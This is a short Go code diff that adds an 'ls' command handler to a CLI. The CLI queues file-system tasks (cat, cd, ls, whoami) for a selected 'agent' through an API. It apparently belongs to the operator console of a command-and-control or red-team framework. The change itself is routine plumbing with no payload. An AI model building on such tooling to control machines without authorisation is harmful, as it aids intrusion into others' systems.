@@ -13,7 +13,6 @@ func (c *CLI) HandleCat(args []string) error {
 		return fmt.Errorf("usage: cat <filename>")
 	}
 
-
 	req := NewTaskReq{
 		AgentId: c.AgentInUse,
 		Command: "cat",
@@ -38,7 +37,6 @@ func (c *CLI) HandleCd(args []string) error {
 		return fmt.Errorf("usage: cd <dir>")
 	}
 
-
 	req := NewTaskReq{
 		AgentId: c.AgentInUse,
 		Command: "cd",
@@ -54,7 +52,35 @@ func (c *CLI) HandleCd(args []string) error {
 	c.term.Printf("[*] Task Issued: %d\n", id)
 	return nil
 
+}
 
+func (c *CLI) HandleLs(args []string) error {
+	if !c.IsUsingAgent() {
+		return nil
+	}
+	if len(args) > 1 {
+		return fmt.Errorf("usage: ls [path]")
+	}
+
+	path := "."
+	if len(args) == 1 {
+		path = args[0]
+	}
+
+	req := NewTaskReq{
+		AgentId: c.AgentInUse,
+		Command: "ls",
+		Args: []Arg{
+			{Type: "string", Arg: path},
+		},
+	}
+	id, err := c.api.NewTask(context.Background(), req)
+	if err != nil {
+		return err
+	}
+
+	c.term.Printf("[*] Task Issued: %d\n", id)
+	return nil
 }
 
 func (c *CLI) HandleWhoami(args []string) error {
